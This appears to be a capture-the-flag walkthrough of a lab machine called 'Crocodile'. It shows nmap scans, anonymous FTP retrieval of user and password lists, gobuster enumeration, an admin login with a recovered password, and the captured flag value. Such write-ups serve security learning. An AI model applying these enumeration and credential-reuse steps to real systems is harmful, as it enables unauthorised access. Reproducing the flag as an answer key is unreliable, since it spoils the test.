# Crocodile

TARGET MACHINE IP ADDRESS
10.129.162.144

# Nmap

```
nmap -Pn 10.129.162.144
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-21 15:25 EST
Nmap scan report for 10.129.162.144
Host is up (0.048s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 3.96 seconds
```

```
nmap -Pn -sS -sV -sC -O -T4 -p 21,80 10.129.162.144
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-21 15:31 EST
Nmap scan report for 10.129.162.144
Host is up (0.047s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.124
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
80/tcp open  http    ((Ubuntu))
|_http-title: Smash - Bootstrap Business Template
|_http-server-header: Apache/2.4.41 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Unix

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.53 seconds
```

## Anonymous Access via FTP

```
ftp anonymous@10.129.162.144
Connected to 10.129.162.144.
220 (vsFTPd 3.0.3)
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||48134|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
```

## Download (GET) the Two Files

```
ftp> get allowed.userlist
local: allowed.userlist remote: allowed.userlist
229 Entering Extended Passive Mode (|||41547|)
150 Opening BINARY mode data connection for allowed.userlist (33 bytes).
100% |****************************************************************************|    33       58.70 KiB/s    00:00 E
226 Transfer complete.
33 bytes received in 00:00 (0.66 KiB/s)

ftp> get allowed.userlist.passwd
local: allowed.userlist.passwd remote: allowed.userlist.passwd
229 Entering Extended Passive Mode (|||48924|)
150 Opening BINARY mode data connection for allowed.userlist.passwd (62 bytes).
100% |****************************************************************************|    62      356.15 KiB/s    00:00 E
226 Transfer complete.
62 bytes received in 00:00 (1.23 KiB/s)

ftp> exit
```

## Read (cat) the Two Files

```
cat allowed.userlist
aron
pwnmeow
egotisticalsw
admin

cat allowed.userlist.passwd 
root
Supersecretpassword1
@BaASD&9032123sADS
rKXM59ESxesUFHAd
```

- NOTE: FTP is anonymous only; could not login with any of the above usernames and passwords.

## Browser 
- Not much there.

## Dir Busting

```
gobuster dir -u 10.129.162.144 -w /usr/share/wordlists/dirb/common.txt -r
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.162.144
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 279]
/.htaccess            (Status: 403) [Size: 279]
/.htpasswd            (Status: 403) [Size: 279]
/assets               (Status: 200) [Size: 1706]
/css                  (Status: 200) [Size: 1353]
/dashboard            (Status: 200) [Size: 1577]
/fonts                (Status: 200) [Size: 1971]
/index.html           (Status: 200) [Size: 58565]
/js                   (Status: 200) [Size: 1141]
/server-status        (Status: 403) [Size: 279]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

- Check out the `/dashboard` subdir: 

## Pwn
- Logged in via the `/dashboard` using admin:rKXM59ESxesUFHAd

![Pasted image 20240221161330](https://github.com/GregKedrovsky/Hacking/assets/26492233/ce9413f7-fc3c-403a-86eb-3e4abc06e8ed)

Here is your flag: c7110277ac44d78b6a9fff2232434d16

## Additional Route In
- Via GoBuster `-x` looking for php files... 

```
gobuster dir -u 10.129.162.144 -w /usr/share/wordlists/dirb/common.txt -r -x php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.162.144
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 279]
/.hta.php             (Status: 403) [Size: 279]
/.hta                 (Status: 403) [Size: 279]
/.htaccess            (Status: 403) [Size: 279]
/.htpasswd            (Status: 403) [Size: 279]
/.htpasswd.php        (Status: 403) [Size: 279]
/.htaccess.php        (Status: 403) [Size: 279]
/assets               (Status: 200) [Size: 1706]
/config.php           (Status: 200) [Size: 0]
/css                  (Status: 200) [Size: 1353]
/dashboard            (Status: 200) [Size: 1577]
/fonts                (Status: 200) [Size: 1971]
/index.html           (Status: 200) [Size: 58565]
/js                   (Status: 200) [Size: 1141]
/login.php            (Status: 200) [Size: 1577]
/logout.php           (Status: 200) [Size: 1577]
/server-status        (Status: 403) [Size: 279]
Progress: 9228 / 9230 (99.98%)
===============================================================
Finished
===============================================================
```

## Browser: login.php

![Pasted image 20240221161816](https://github.com/GregKedrovsky/Hacking/assets/26492233/bb3c3964-cd2c-4469-8e78-bb237562137d)

- That's the same login as I got when I went to the `/dashboard` directory.

![Pasted image 20240221161855](https://github.com/GregKedrovsky/Hacking/assets/26492233/0cd1d98f-46cd-4161-90fb-81c5358e4f7f)

